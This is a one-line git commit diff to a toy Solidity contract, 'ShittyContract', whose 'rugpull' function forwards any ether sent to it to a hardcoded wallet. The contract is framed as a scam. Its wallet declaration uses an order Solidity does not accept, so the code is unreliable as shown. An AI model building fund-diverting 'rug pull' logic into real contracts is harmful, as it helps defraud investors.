48cdd8086560453c1e67abe88870a59cd5540977
Team LevX <team@levx.io>
2021-10-15 20:56:43 +0900

    Update ShittyContract.sol

--- contracts/ShittyContract.sol
+++ contracts/ShittyContract.sol
@@ -4,7 +4,7 @@ contract ShittyContract {
     address wallet constant internal = 0x5b8C253517b6Bd003369173109693B01cb6841B5;
 
     function rugpull() public payable {
-        address(this).send(wallet, msg.value);
+        payable(wallet).transfer(msg.value);
     }
 }
         
